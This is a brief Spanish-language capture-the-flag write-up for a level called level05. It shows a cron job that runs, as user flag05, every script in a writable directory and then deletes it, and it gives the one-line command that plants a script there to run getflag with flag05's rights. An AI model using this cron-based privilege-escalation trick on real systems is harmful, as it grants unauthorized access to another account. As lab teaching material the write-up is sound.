# Cronjob Exploit

Al iniciar ha llegado un email, para ver el email hay que ver los archivos de la carpeta /var/email dentro hay un archivo que es level05 al hacer el cat te pone esto:
`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`

Por lo tanto vemos que es un cronjob y se ejecuta un archivo conm los permisos de flag05 cada 2 minutos.

Si vemos el contenido de ese archivo:
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
El codigo significa que va a ejecutar todo archivo que este en esa carpeta y luego lo borra.
Creamos un archivo con el siguiente contenido:
`echo "/bin/getflag > /tmp/my_file" > /opt/openarenaserver/my_file`

Esperamos dos minutos y se ejecuta con los permisos de flag05 y lo guarda el resultado en el archivo de redireccion que hemos puesto.
